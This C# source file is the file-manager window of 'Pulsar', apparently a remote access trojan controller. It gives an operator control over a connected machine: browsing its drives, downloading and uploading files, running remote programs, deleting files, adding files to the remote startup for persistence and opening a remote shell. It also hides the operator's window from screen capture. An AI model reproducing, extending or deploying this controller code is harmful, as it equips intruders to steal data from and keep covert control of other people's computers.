using Pulsar.Common.Enums;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Models;
using Pulsar.Server.Controls;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Windows.Forms;
using Process = System.Diagnostics.Process;

namespace Pulsar.Server.Forms
{
    public partial class FrmFileManager : Form
    {
        /// <summary>
        /// The current remote directory shown in the file manager.
        /// </summary>
        private string _currentDir;

        /// <summary>
        /// The client which can be used for the file manager.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly FileManagerHandler _fileManagerHandler;
        private readonly Timer _refreshDebounce = new Timer();
        private enum TransferColumn
        {
            Id,
            Type,
            Status,
        }

        /// <summary>
        /// Holds the opened file manager form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmFileManager> OpenedForms = new Dictionary<Client, FrmFileManager>();

        /// <summary>
        /// Cached directory entries for VirtualMode ListView.
        /// Index 0 in ListView is "..", so these map from index-1.
        /// </summary>
        private FileSystemEntry[] _cachedItems = Array.Empty<FileSystemEntry>();

        /// <summary>
        /// Simple sort state for VirtualMode ListView.
        /// </summary>
        private int _sortColumn = 0;
        private bool _sortAscending = true;

        /// <summary>
        /// Creates a new file manager form for the client or gets the current open form, if there exists one already.
        /// </summary>
        public static FrmFileManager CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmFileManager f = new FrmFileManager(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmFileManager"/> class using the given client.
        /// </summary>
        public FrmFileManager(Client client)
        {
            _connectClient = client;
            _fileManagerHandler = new FileManagerHandler(client);

            InitializeComponent();

            // -----------------------------------------
            // 🟢 1. Enable DoubleBuffer (before VirtualMode)
            // -----------------------------------------
            typeof(Control).GetProperty(
                "DoubleBuffered",
                System.Reflection.BindingFlags.Instance |
                System.Reflection.BindingFlags.NonPublic
            )?.SetValue(lstDirectory, true);

            // -----------------------------------------
            // 🟢 2. Create & configure debounce timer HERE
            // -----------------------------------------
            _refreshDebounce = new Timer();
            _refreshDebounce.Interval = 100;  // 100 ms debounce
            _refreshDebounce.Tick += (s, e) =>
            {
                _refreshDebounce.Stop();
                if (!string.IsNullOrEmpty(_currentDir))
                    _fileManagerHandler.GetDirectoryContents(_currentDir);
            };

            // -----------------------------------------
            // 🟢 3. Setup VirtualMode (after buffering)
            // -----------------------------------------
            lstDirectory.VirtualMode = true;
            lstDirectory.RetrieveVirtualItem += LstDirectory_RetrieveVirtualItem;
            lstDirectory.FullRowSelect = true;

            // -----------------------------------------
            // 🟢 4. SCROLL SNAP — Prevent empty space above first item
            // -----------------------------------------
            var scrollHook = new ListViewScrollHook(lstDirectory);
            scrollHook.Scroll += (s, e) =>
            {
                // FIX: Only snap if user is trying to scroll above item 0
                if (lstDirectory.TopItem != null &&
                    lstDirectory.TopItem.Index == 0 &&
                    lstDirectory.Items.Count > 0)
                {
                    // Allow normal scrolling
                    return;
                }

                if (lstDirectory.TopItem != null &&
                    lstDirectory.TopItem.Index < 0)
                {
                    // Safety snap ONLY if top < 0 (should never happen)
                    try { lstDirectory.TopItem = lstDirectory.Items[0]; } catch { }
                }
            };


            // -----------------------------------------
            // 🟢 5. Register handlers, keybinds, dark mode
            // -----------------------------------------
            RegisterMessageHandler();
            txtPath.KeyDown += TxtPath_KeyDown;

            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        private string NormalizeUserTypedPath(string input)
        {
            if (string.IsNullOrWhiteSpace(input))
                return input;

            string path = input.Trim();

            // Expand %ENVVAR%
            path = Environment.ExpandEnvironmentVariables(path);

            // Expand ~ to user profile
            if (path.StartsWith("~"))
            {
                string profile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                path = Path.Combine(profile, path.Substring(1).TrimStart('\\', '/'));
            }

            // Fix forward slashes
            path = path.Replace('/', '\\');

            // Handle drive-letter without slash:  C:  →  C:\
            if (path.Length == 2 && char.IsLetter(path[0]) && path[1] == ':')
                path += "\\";

            // Ensure full absolute path
            try
            {
                path = Path.GetFullPath(path);
            }
            catch
            {
                // Invalid paths get returned raw, client handles errors already
            }

            return path;
        }

        private void TxtPath_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode != Keys.Enter)
                return;

            e.Handled = true;
            e.SuppressKeyPress = true;

            string newPath = NormalizeUserTypedPath(txtPath.Text);

            if (string.IsNullOrWhiteSpace(newPath))
                return;

            _fileManagerHandler.GetDirectoryContents(newPath);
            SetStatusMessage(this, $"Opening {newPath} ...");

            var timer = new System.Windows.Forms.Timer();
            timer.Interval = 500;
            timer.Tick += (s, ev) =>
            {
                timer.Stop();

                if (_currentDir != newPath)
                {
                    txtPath.Text = _currentDir; // revert
                }
            };
            timer.Start();
        }

        /// <summary>
        /// Registers the file manager message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _fileManagerHandler.ProgressChanged += SetStatusMessage;
            _fileManagerHandler.DrivesChanged += DrivesChanged;
            _fileManagerHandler.DirectoryChanged += DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
            MessageHandler.Register(_fileManagerHandler);
        }

        /// <summary>
        /// Unregisters the file manager message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_fileManagerHandler);
            _fileManagerHandler.ProgressChanged -= SetStatusMessage;
            _fileManagerHandler.DrivesChanged -= DrivesChanged;
            _fileManagerHandler.DirectoryChanged -= DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated -= FileTransferUpdated;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void DrivesChanged(object sender, Drive[] drives)
        {
            var list = new List<object>();

            // ----- DRIVES ON TOP -----
            foreach (var d in drives)
            {
                list.Add(new
                {
                    DisplayName = $"{d.DisplayName}",
                    RootDirectory = d.RootDirectory
                });
            }

            void AddCommon(string label, string path)
            {
                if (!string.IsNullOrEmpty(path) && Directory.Exists(path))
                {
                    list.Add(new
                    {
                        DisplayName = $"[{label}]  {path}",
                        RootDirectory = path
                    });
                }
            }

            void AddCommonSF(string label, Environment.SpecialFolder sf)
            {
                string p = Environment.GetFolderPath(sf);
                AddCommon(label, p);
            }

            // ----- USER COMMON DIRECTORIES -----
            AddCommonSF("Desktop", Environment.SpecialFolder.Desktop);
            AddCommonSF("Documents", Environment.SpecialFolder.MyDocuments);
            AddCommon("Downloads", SpecialPath.Downloads);
            AddCommonSF("Pictures", Environment.SpecialFolder.MyPictures);
            AddCommonSF("Music", Environment.SpecialFolder.MyMusic);
            AddCommonSF("Videos", Environment.SpecialFolder.MyVideos);
            AddCommonSF("AppData (Local)", Environment.SpecialFolder.LocalApplicationData);
            AddCommonSF("AppData (Roaming)", Environment.SpecialFolder.ApplicationData);
            AddCommon("LocalLow", Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                "AppData\\LocalLow"));

            AddCommon("Temp", Path.GetTempPath());

            // ----- SYSTEM COMMON DIRECTORIES -----
            AddCommon("Program Files", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
            AddCommon("Program Files (x86)", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
            AddCommon("Windows", Environment.GetFolderPath(Environment.SpecialFolder.Windows));
            AddCommon("System32", Environment.GetFolderPath(Environment.SpecialFolder.System));

            AddCommon("ProgramData", Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));

            // ----- PUBLIC (Shared) -----
            AddCommon("Public Desktop", Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
            AddCommon("Public Documents", Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));

            // ----- USER ROOT -----
            AddCommon("User Profile", Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));

            // ----- APPLY TO COMBOBOX -----
            cmbDrives.Items.Clear();
            cmbDrives.DisplayMember = "DisplayName";
            cmbDrives.ValueMember = "RootDirectory";
            cmbDrives.DataSource = list;

            SetStatusMessage(this, "Ready");
        }

        private static class SpecialPath
        {
            public static string Downloads =>
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
        }

        /// <summary>
        /// Called whenever a directory changed (remote side).
        /// Updates the cache and VirtualListSize, avoiding UI freezes.
        /// </summary>
        private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
        {
            _currentDir = remotePath;
            txtPath.Text = remotePath;

            _cachedItems = (items ?? Array.Empty<FileSystemEntry>())
                .OrderBy(e => e.EntryType != FileType.Directory)
                .ThenBy(e => e.Name, StringComparer.OrdinalIgnoreCase)
                .ToArray();

            using (new RedrawScope(lstDirectory))
            {
                lstDirectory.BeginUpdate();
                lstDirectory.VirtualListSize = _cachedItems.Length + 1;
                lstDirectory.EndUpdate();
            }

            SetStatusMessage(this, "Ready");
        }

        /// <summary>
        /// Provides virtual items to the ListView on demand.
        /// This is what prevents freezes when listing huge folders.
        /// </summary>
        private void LstDirectory_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
        {
            // index 0 is ".."
            if (e.ItemIndex == 0)
            {
                var backItem = new ListViewItem(new[] { "..", string.Empty, string.Empty })
                {
                    Tag = new FileManagerListTag(FileType.Back, 0),
                    ImageIndex = 0
                };
                e.Item = backItem;
                return;
            }

            int index = e.ItemIndex - 1;
            if (_cachedItems == null || index < 0 || index >= _cachedItems.Length)
            {
                e.Item = new ListViewItem(new[] { string.Empty, string.Empty, string.Empty });
                return;
            }

            var entry = _cachedItems[index];

            int imageIndex;
            if (entry.EntryType == FileType.Directory)
            {
                imageIndex = 1; // dir icon index
            }
            else
            {
                imageIndex = entry.ContentType == null ? 2 : (int)entry.ContentType;
            }

            var sizeText = entry.EntryType == FileType.File
                ? StringHelper.GetHumanReadableFileSize(entry.Size)
                : string.Empty;

            var lvi = new ListViewItem(new[]
            {
                entry.Name,
                sizeText,
                entry.EntryType.ToString()
            })
            {
                Tag = new FileManagerListTag(entry.EntryType, entry.Size),
                ImageIndex = imageIndex
            };

            e.Item = lvi;
        }

        /// <summary>
        /// Sort the cached items for VirtualMode.
        /// </summary>
        private void SortCachedItems()
        {
            if (_cachedItems == null || _cachedItems.Length == 0)
                return;

            IOrderedEnumerable<FileSystemEntry> ordered;

            switch (_sortColumn)
            {
                case 0: // Name
                    ordered = _cachedItems
                        .OrderBy(e => e.EntryType != FileType.Directory)
                        .ThenBy(e => e.Name, StringComparer.OrdinalIgnoreCase);
                    break;

                case 1: // Size
                    ordered = _cachedItems
                        .OrderBy(e => e.EntryType != FileType.File)
                        .ThenBy(e => e.Size);
                    break;

                case 2: // Type
                    ordered = _cachedItems
                        .OrderBy(e => e.EntryType.ToString(), StringComparer.OrdinalIgnoreCase)
                        .ThenBy(e => e.Name, StringComparer.OrdinalIgnoreCase);
                    break;

                default:
                    ordered = _cachedItems
                        .OrderBy(e => e.EntryType != FileType.Directory)
                        .ThenBy(e => e.Name, StringComparer.OrdinalIgnoreCase);
                    break;
            }

            _cachedItems = _sortAscending ? ordered.ToArray() : ordered.Reverse().ToArray();
        }

        private int GetTransferImageIndex(string status)
        {
            int imageIndex = -1;
            switch (status)
            {
                case "Completed":
                    imageIndex = 1;
                    break;
                case "Canceled":
                    imageIndex = 0;
                    break;
            }

            return imageIndex;
        }

        private void FileTransferUpdated(object sender, FileTransfer transfer)
        {
            for (var i = 0; i < lstTransfers.Items.Count; i++)
            {
                if (lstTransfers.Items[i].SubItems[(int)TransferColumn.Id].Text == transfer.Id.ToString())
                {
                    lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = transfer.Status;
                    lstTransfers.Items[i].ImageIndex = GetTransferImageIndex(transfer.Status);
                    return;
                }
            }

            var lvi = new ListViewItem(new[]
                    {transfer.Id.ToString(), transfer.Type.ToString(), transfer.Status, transfer.RemotePath})
            { Tag = transfer, ImageIndex = GetTransferImageIndex(transfer.Status) };

            lstTransfers.Items.Add(lvi);
        }

        private string GetAbsolutePath(string path)
        {
            if (!string.IsNullOrEmpty(_currentDir) && _currentDir[0] == '/') // support forward slashes
            {
                if (_currentDir.Length == 1)
                    return Path.Combine(_currentDir, path);
                else
                    return Path.Combine(_currentDir + '/', path);
            }

            return Path.GetFullPath(Path.Combine(_currentDir, path));
        }

        private string NavigateUp()
        {
            if (!string.IsNullOrEmpty(_currentDir) && _currentDir[0] == '/') // support forward slashes
            {
                if (_currentDir.LastIndexOf('/') > 0)
                {
                    _currentDir = _currentDir.Remove(_currentDir.LastIndexOf('/') + 1);
                    _currentDir = _currentDir.TrimEnd('/');
                }
                else
                    _currentDir = "/";

                return _currentDir;
            }
            else
                return GetAbsolutePath(@"..\");
        }

        private void FrmFileManager_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("File Manager", _connectClient);
            _fileManagerHandler.RefreshDrives();
        }

        private void FrmFileManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            _fileManagerHandler.Dispose();
        }

        private void cmbDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (cmbDrives.SelectedValue == null)
                return;

            SwitchDirectory(cmbDrives.SelectedValue.ToString());
        }

        private void lstDirectory_DoubleClick(object sender, EventArgs e)
        {
            int index = -1;

            if (lstDirectory.SelectedIndices.Count > 0)
                index = lstDirectory.SelectedIndices[0];
            else if (lstDirectory.FocusedItem != null)
                index = lstDirectory.FocusedItem.Index;

            if (index < 0)
                return;

            if (index == 0)
            {
                // ".."
                SwitchDirectory(NavigateUp());
                return;
            }

            int cacheIndex = index - 1;
            if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                return;

            var entry = _cachedItems[cacheIndex];

            if (entry.EntryType == FileType.Directory)
            {
                string newPath = GetAbsolutePath(entry.Name);
                SwitchDirectory(newPath);
            }
        }

        private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            if (_cachedItems == null || _cachedItems.Length == 0)
                return;

            if (e.Column == _sortColumn)
                _sortAscending = !_sortAscending;
            else
            {
                _sortColumn = e.Column;
                _sortAscending = true;
            }

            SortCachedItems();
            lstDirectory.Refresh();
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (int index in lstDirectory.SelectedIndices)
            {
                if (index == 0) // skip ".."
                    continue;

                int cacheIndex = index - 1;
                if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                    continue;

                var entry = _cachedItems[cacheIndex];

                if (entry.EntryType == FileType.File)
                {
                    string remotePath = GetAbsolutePath(entry.Name);
                    _fileManagerHandler.BeginDownloadFile(remotePath);
                }
            }
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Title = "Select files to upload";
                ofd.Filter = "All files (*.*)|*.*";
                ofd.Multiselect = true;

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    foreach (var localFilePath in ofd.FileNames)
                    {
                        if (!File.Exists(localFilePath)) continue;

                        string remotePath = GetAbsolutePath(Path.GetFileName(localFilePath));
                        _fileManagerHandler.BeginUploadFile(localFilePath, remotePath);
                    }
                }
            }
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (int index in lstDirectory.SelectedIndices)
            {
                if (index == 0) // skip ".."
                    continue;

                int cacheIndex = index - 1;
                if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                    continue;

                var entry = _cachedItems[cacheIndex];

                if (entry.EntryType == FileType.File)
                {
                    string remotePath = GetAbsolutePath(entry.Name);
                    _fileManagerHandler.StartProcess(remotePath);
                }
            }
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (int index in lstDirectory.SelectedIndices)
            {
                if (index == 0) // skip ".."
                    continue;

                int cacheIndex = index - 1;
                if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                    continue;

                var entry = _cachedItems[cacheIndex];

                if (entry.EntryType == FileType.Directory || entry.EntryType == FileType.File)
                {
                    string path = GetAbsolutePath(entry.Name);
                    string newName = entry.Name;

                    if (InputBox.Show("New name", "Enter new name:", ref newName) == DialogResult.OK)
                    {
                        string newPath = GetAbsolutePath(newName);
                        _fileManagerHandler.RenameFile(path, newPath, entry.EntryType);
                    }
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int count = lstDirectory.SelectedIndices.Count;
            if (count == 0) return;

            if (MessageBox.Show(
                    $"Are you sure you want to delete {count} file(s)?",
                    "Delete Confirmation",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (int index in lstDirectory.SelectedIndices)
                {
                    if (index == 0) // skip ".."
                        continue;

                    int cacheIndex = index - 1;
                    if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                        continue;

                    var entry = _cachedItems[cacheIndex];

                    if (entry.EntryType == FileType.Directory || entry.EntryType == FileType.File)
                    {
                        string path = GetAbsolutePath(entry.Name);
                        _fileManagerHandler.DeleteFile(path, entry.EntryType);
                    }
                }
            }
        }

        private void addToStartupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (int index in lstDirectory.SelectedIndices)
            {
                if (index == 0) // skip ".."
                    continue;

                int cacheIndex = index - 1;
                if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                    continue;

                var entry = _cachedItems[cacheIndex];

                if (entry.EntryType == FileType.File)
                {
                    string path = GetAbsolutePath(entry.Name);

                    using (var frm = new FrmStartupAdd(path))
                    {
                        if (frm.ShowDialog() == DialogResult.OK)
                        {
                            _fileManagerHandler.AddToStartup(frm.StartupItem);
                        }
                    }
                }
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RefreshDirectory();
        }

        private void openDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string path = _currentDir;

            if (lstDirectory.SelectedIndices.Count == 1)
            {
                int index = lstDirectory.SelectedIndices[0];

                if (index > 0)
                {
                    int cacheIndex = index - 1;
                    if (_cachedItems != null && cacheIndex >= 0 && cacheIndex < _cachedItems.Length)
                    {
                        var entry = _cachedItems[cacheIndex];
                        if (entry.EntryType == FileType.Directory)
                            path = GetAbsolutePath(entry.Name);
                    }
                }
            }

            FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(_connectClient);
            frmRs.Show();
            frmRs.Focus();

            var driveLetter = Path.GetPathRoot(path);
            frmRs.RemoteShellHandler.SendCommand($"{driveLetter.Remove(driveLetter.Length - 1)} && cd \"{path}\"");
        }

        private void btnOpenDLFolder_Click(object sender, EventArgs e)
        {
            if (!Directory.Exists(_connectClient.Value.DownloadDirectory))
                Directory.CreateDirectory(_connectClient.Value.DownloadDirectory);

            Process.Start("explorer.exe", _connectClient.Value.DownloadDirectory);
        }

        private void cancelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.SelectedItems)
            {
                if (!transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Downloading") &&
                    !transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Uploading") &&
                    !transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Pending")) continue;

                int id = int.Parse(transfer.SubItems[(int)TransferColumn.Id].Text);
                _fileManagerHandler.CancelFileTransfer(id);
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.Items)
            {
                if (transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Downloading") ||
                    transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Uploading") ||
                    transfer.SubItems[(int)TransferColumn.Status].Text.StartsWith("Pending")) continue;
                transfer.Remove();
            }
        }

        private void lstDirectory_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop)) // allow drag & drop with files
                e.Effect = DragDropEffects.Copy;
        }

        private void lstDirectory_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
                foreach (string localFilePath in files)
                {
                    if (!File.Exists(localFilePath)) continue;

                    string remotePath = GetAbsolutePath(Path.GetFileName(localFilePath));
                    _fileManagerHandler.BeginUploadFile(localFilePath, remotePath);
                }
            }
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            RefreshDirectory();
        }

        private void FrmFileManager_KeyDown(object sender, KeyEventArgs e)
        {
            // refresh when F5 is pressed
            if (e.KeyCode == Keys.F5 && !string.IsNullOrEmpty(_currentDir) && TabControlFileManager.SelectedIndex == 0)
            {
                RefreshDirectory();
                e.Handled = true;
            }
        }

        /// <summary>
        /// Legacy manual-add method (not used in VirtualMode path).
        /// Kept in case you ever switch back to non-virtual ListView.
        /// </summary>
        private void AddItemToFileBrowser(string name, long size, FileType type, int imageIndex)
        {
            ListViewItem lvi = new ListViewItem(new string[]
            {
                name,
                (type == FileType.File) ? StringHelper.GetHumanReadableFileSize(size) : string.Empty,
                (type != FileType.Back) ? type.ToString() : string.Empty
            })
            {
                Tag = new FileManagerListTag(type, size),
                ImageIndex = imageIndex
            };

            lstDirectory.Items.Add(lvi);
        }

        private void SetStatusMessage(object sender, string message)
        {
            stripLblStatus.Text = $"Status: {message}";
        }

        private void RefreshDirectory()
        {
            if (string.IsNullOrEmpty(_currentDir))
                return;

            _refreshDebounce.Stop();   // restart debounce
            _refreshDebounce.Start();
        }
        private void lstDirectory_Scroll(object sender, ScrollEventArgs e)
        {
            if (lstDirectory.TopItem != null && lstDirectory.TopItem.Index > 0)
            {
                try
                {
                    lstDirectory.TopItem = lstDirectory.Items[0]; // snap back to top
                }
                catch { }
            }
        }
        public class ListViewScrollHook : NativeWindow
        {
            private const int WM_VSCROLL = 0x115;
            private const int WM_MOUSEWHEEL = 0x20A;

            public event ScrollEventHandler Scroll;

            public ListViewScrollHook(ListView lv)
            {
                AssignHandle(lv.Handle);
            }

            protected override void WndProc(ref Message m)
            {
                if (m.Msg == WM_VSCROLL || m.Msg == WM_MOUSEWHEEL)
                {
                    Scroll?.Invoke(this, new ScrollEventArgs(
                        ScrollEventType.EndScroll, 0));
                }

                base.WndProc(ref m);
            }
        }


        public static void OpenDownloadFolderFor(Client client)
        {
            var path = client.Value.DownloadDirectory;

            if (!Directory.Exists(path))
                Directory.CreateDirectory(path);

            Process.Start("explorer.exe", path);
        }

        private void SwitchDirectory(string remotePath)
        {
            if (string.IsNullOrWhiteSpace(remotePath))
                return;

            _fileManagerHandler.GetDirectoryContents(remotePath);
            SetStatusMessage(this, "Loading directory content...");
        }

        private void zipFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstDirectory.SelectedIndices.Count != 1) return;

            int index = lstDirectory.SelectedIndices[0];
            if (index == 0) return;

            int cacheIndex = index - 1;
            if (_cachedItems == null || cacheIndex < 0 || cacheIndex >= _cachedItems.Length)
                return;

            var entry = _cachedItems[cacheIndex];
            if (entry.EntryType != FileType.Directory)
            {
                MessageBox.Show("Please select a directory to zip.", "Zip Folder",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            string folderPath = GetAbsolutePath(entry.Name);
            string zipFileName = $"{Path.GetFileName(folderPath)}.zip";
            string destinationPath = Path.Combine(Path.GetDirectoryName(folderPath), zipFileName);

            _fileManagerHandler.ZipFolder(folderPath, destinationPath, (int)CompressionLevel.Optimal);
        }

        private void executeFileOnServerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstTransfers.SelectedItems.Count == 0)
                return;

            foreach (ListViewItem item in lstTransfers.SelectedItems)
            {
                var transfer = item.Tag as FileTransfer;
                if (transfer == null)
                    continue;

                // build local path (FIX)
                string localPath = Path.Combine(
                    _connectClient.Value.DownloadDirectory,
                    Path.GetFileName(transfer.RemotePath)
                );

                // check if file is physically downloaded (REAL fix)
                if (!File.Exists(localPath))
                {
                    MessageBox.Show(
                        $"File is not fully downloaded yet:\n{localPath}",
                        "Cannot Execute",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Warning
                    );
                    continue;
                }

                // run the downloaded file locally
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = localPath,
                        UseShellExecute = true
                    });

                    SetStatusMessage(this, $"Executing {localPath}...");
                }
                catch (Exception ex)
                {
                    MessageBox.Show(
                        $"Failed to execute downloaded file:\n{ex.Message}",
                        "Execution Error",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error
                    );
                }
            }
        }


        // ------------------------ RedrawScope (unused here but kept if you want it elsewhere) ------------------------
        internal readonly struct RedrawScope : IDisposable
        {
            private readonly Control _ctl;
            private readonly IntPtr _handle;

            [System.Runtime.InteropServices.DllImport("user32.dll")]
            private static extern IntPtr SendMessage(IntPtr hWnd, int msg, int wParam, int lParam);

            private const int WM_SETREDRAW = 0x0B;

            public RedrawScope(Control c)
            {
                _ctl = c;
                _handle = c.IsHandleCreated ? c.Handle : IntPtr.Zero;
                if (_handle != IntPtr.Zero)
                    SendMessage(_handle, WM_SETREDRAW, 0, 0); // stop redraw
            }

            public void Dispose()
            {
                if (_handle != IntPtr.Zero)
                {
                    SendMessage(_handle, WM_SETREDRAW, 1, 0); // resume redraw
                    _ctl.Invalidate();
                }
            }
        }
        // -----------------------------------------------------------------
    }
}
